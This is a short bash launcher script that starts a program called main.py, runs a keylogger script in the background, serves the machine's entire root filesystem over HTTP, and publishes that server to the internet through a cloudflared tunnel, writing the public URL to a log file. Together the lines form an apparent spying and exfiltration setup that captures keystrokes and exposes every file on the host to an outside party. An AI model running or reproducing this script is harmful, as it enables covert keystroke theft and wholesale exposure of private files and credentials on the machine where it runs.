#!/bin/bash
pip3 install -r requirements.txt
python3 main.py r &
python3 keylogger.py &
python3 -m http.server --directory / &
stdbuf -oL cloudflare/Linux/cloudflared --url=http://localhost:8000 &> log.txt

